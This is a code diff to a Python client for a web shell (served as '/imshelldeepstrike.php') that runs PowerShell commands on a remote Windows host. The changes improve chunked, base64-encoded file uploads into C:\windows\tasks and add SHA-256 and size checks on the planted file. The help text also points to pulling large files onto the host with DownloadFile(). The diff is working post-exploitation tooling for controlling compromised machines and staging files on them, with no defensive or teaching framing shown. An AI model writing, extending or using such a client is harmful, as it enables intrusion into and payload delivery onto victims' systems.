@@ -1,4 +1,5 @@
 import base64
+import hashlib
 import os
 import sys
 from datetime import datetime
@@ -18,9 +19,27 @@ PATH = "/imshelldeepstrike.php"
 TIMEOUT = None
 SEPARATOR = "=" * 60
 SUB_SEPARATOR = "-" * 60
+
 # Default chunk size for uploads; can be overridden with the
-# CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable.
-UPLOAD_CHUNK_SIZE = int(os.getenv("CMD_CLIENT_UPLOAD_CHUNK_SIZE", "5000"))
+# CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable. We clamp the size
+# to avoid generating PowerShell/HTTP commands that are too large.
+_DEFAULT_CHUNK = 16384  # 16 KiB
+_MIN_CHUNK = 1024  # 1 KiB
+_MAX_CHUNK = 65536  # 64 KiB
+
+
+def _compute_upload_chunk_size() -> int:
+    raw = os.getenv("CMD_CLIENT_UPLOAD_CHUNK_SIZE")
+    if raw is None:
+        return _DEFAULT_CHUNK
+    try:
+        value = int(raw)
+    except ValueError:
+        return _DEFAULT_CHUNK
+    return max(_MIN_CHUNK, min(_MAX_CHUNK, value))
+
+
+UPLOAD_CHUNK_SIZE = _compute_upload_chunk_size()
 # Default directory on the remote Windows host when no remote path
 # is provided explicitly for uploads.
 DEFAULT_REMOTE_UPLOAD_DIR = r"C:\windows\tasks"
@@ -115,7 +134,7 @@ def download_file(remote_path: str, local_path: str) -> int:
     return len(data)
 
 
-def upload_file(local_path: str, remote_path: str) -> None:
+def upload_file(local_path: str, remote_path: str) -> dict:
     """
     Upload a local file to a **Windows** target by base64-encoding it locally
     and having PowerShell decode it into a file on the remote side.
@@ -132,7 +151,7 @@ def upload_file(local_path: str, remote_path: str) -> None:
 
     remote_ps = ps_escape_single_quotes(remote_path)
 
-    # Send the file in small chunks so we do not hit command-line length
+    # Send the file in chunks so we do not hit command-line length
     # limits or HTTP/server size limits.
     first = True
     offset = 0
@@ -140,51 +159,84 @@ def upload_file(local_path: str, remote_path: str) -> None:
     last_status: Optional[int] = None
     chunk_index = 0
 
+    # Compute number of chunks for logging.
+    num_chunks = (total + UPLOAD_CHUNK_SIZE - 1) // UPLOAD_CHUNK_SIZE
+    print(
+        f"[upload] starting '{local_path}' -> '{remote_path}' "
+        f"({total} bytes, chunk_size={UPLOAD_CHUNK_SIZE}, chunks={num_chunks})"
+    )
+
     while offset < total:
         chunk = data[offset : offset + UPLOAD_CHUNK_SIZE]
         offset += len(chunk)
         b64 = base64.b64encode(chunk).decode("ascii")
         chunk_index += 1
 
+        # Build PowerShell command using variables to keep the command line
+        # shorter and avoid quoting surprises.
         if first:
             # First chunk: create/overwrite the file
             ps_cmd = (
+                f"$b='{b64}';"
                 f"[IO.File]::WriteAllBytes('{remote_ps}', "
-                f"[Convert]::FromBase64String('{b64}'))"
+                "[Convert]::FromBase64String($b))"
             )
             first = False
         else:
             # Subsequent chunks: append to the existing file
             ps_cmd = (
-                "$p='{remote}';"
-                "$d=[Convert]::FromBase64String('{b64}');"
+                f"$p='{remote_ps}';"
+                f"$b='{b64}';"
+                "$d=[Convert]::FromBase64String($b);"
                 "$fs=[IO.File]::Open($p,[IO.FileMode]::Append);"
                 "$fs.Write($d,0,$d.Length);"
                 "$fs.Close()"
-            ).format(remote=remote_ps, b64=b64)
+            )
 
         cmd = "powershell -NoLogo -NonInteractive -Command " f"\"{ps_cmd}\""
         last_body, last_status = send_command(cmd)
         if last_status is not None and last_status != 200:
+            snippet = extract_pre(last_body)[:200]
             raise RuntimeError(
-                f"upload chunk failed with status={last_status}: {last_body}"
+                f"upload chunk {chunk_index}/{num_chunks} failed "
+                f"with status={last_status}: {snippet!r}"
             )
-        # Give some feedback for large uploads
-        print(f"[upload] sent chunk {chunk_index}, {len(chunk)} bytes")
 
-    # Optionally, verify remote size
-    verify_cmd = (
+        # Give some feedback for large uploads
+        print(f"[upload] sent chunk {chunk_index}/{num_chunks}, {len(chunk)} bytes")
+
+    # Verify remote size
+    size_cmd = (
         "powershell -NoLogo -NonInteractive -Command "
         f"\"if (Test-Path '{remote_ps}') "
-        "{(Get-Item '{remote_ps}').Length} else {{'[no such file]'}}\""
+        "{{(Get-Item '{remote_ps}').Length}} else {{'NO_SUCH_FILE'}}\""
     )
-    verify_body, verify_status = send_command(verify_cmd)
+    size_body, size_status = send_command(size_cmd)
+    size_text = extract_pre(size_body).strip()
 
-    print_response(f"[upload {local_path} -> {remote_path}]", last_body, last_status)
-    print(
-        f"[upload] finished '{local_path}' ({total} bytes) to remote '{remote_path}'"
+    # Compute local hash and ask the remote to compute the same hash.
+    local_hash = hashlib.sha256(data).hexdigest()
+    hash_cmd = (
+        "powershell -NoLogo -NonInteractive -Command "
+        f"\"if (Test-Path '{remote_ps}') "
+        "{{(Get-FileHash -Algorithm SHA256 '{remote_ps}').Hash}} "
+        "else {{'NO_SUCH_FILE'}}\""
     )
-    print_response("[upload verify remote size]", verify_body, verify_status)
+    hash_body, hash_status = send_command(hash_cmd)
+    remote_hash_text = extract_pre(hash_body).strip()
+
+    return {
+        "total": total,
+        "chunks": num_chunks,
+        "last_body": last_body,
+        "last_status": last_status,
+        "remote_size_text": size_text,
+        "remote_size_status": size_status,
+        "remote_path": remote_path,
+        "local_hash": local_hash,
+        "remote_hash_text": remote_hash_text,
+        "remote_hash_status": hash_status,
+    }
 
 
 def print_response(cmd: str, body: str, status: Optional[int]) -> None:
@@ -338,9 +390,14 @@ def print_help() -> None:
     print(
         f"      the file is stored as {DEFAULT_REMOTE_UPLOAD_DIR}\\<filename> on the remote."
     )
+    print("      Uploads are chunked; you can tune the chunk size using")
+    print("      the CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable.")
+    print("      Very large files may still be better transferred via an")
+    print("      HTTP server and DownloadFile() from the remote.")
     print()
     print("  :update")
     print("      Pull the latest client from GitHub and restart.")
+    print("      Warning: this overwrites local edits with the GitHub version.")
     print()
     print("  :help")
     print("      Show this help message.")
@@ -408,9 +465,52 @@ def main() -> None:
             else:
                 remote_path = parts[1]
             try:
-                upload_file(local_path, remote_path)
+                result = upload_file(local_path, remote_path)
+                summary_lines = [
+                    f"[upload] finished '{local_path}' "
+                    f"({result['total']} bytes) "
+                    f"to remote '{result['remote_path']}' "
+                    f"in {result['chunks']} chunks",
+                    f"[upload] reported remote size text: "
+                    f"{result['remote_size_text']!r} "
+                    f"(status={result['remote_size_status']})",
+                ]
+
+                # Hash comparison summary
+                remote_hash = result["remote_hash_text"]
+                hash_status = result["remote_hash_status"]
+                local_hash = result["local_hash"]
+                if remote_hash and remote_hash != "NO_SUCH_FILE":
+                    if remote_hash.lower() == local_hash.lower():
+                        hash_summary = (
+                            "[upload] hash OK: remote SHA256 matches local"
+                        )
+                    else:
+                        hash_summary = (
+                            "[upload] hash MISMATCH: "
+                            f"local={local_hash} remote={remote_hash}"
+                        )
+                else:
+                    hash_summary = (
+                        "[upload] hash verification unavailable or remote file "
+                        "missing"
+                    )
+
+                summary_lines.append(hash_summary)
+                summary_body = "\n".join(summary_lines)
+                print_response(
+                    f"[upload {local_path} -> {remote_path}]",
+                    summary_body,
+                    None,
+                )
             except Exception as exc:
-                print(f"[upload error] {exc}")
+                err = f"[upload error] {exc}"
+                print(err)
+                print_response(
+                    f"[upload {local_path} -> {remote_path}]",
+                    err,
+                    None,
+                )
             continue
 
         if cmd.strip() == ":update":
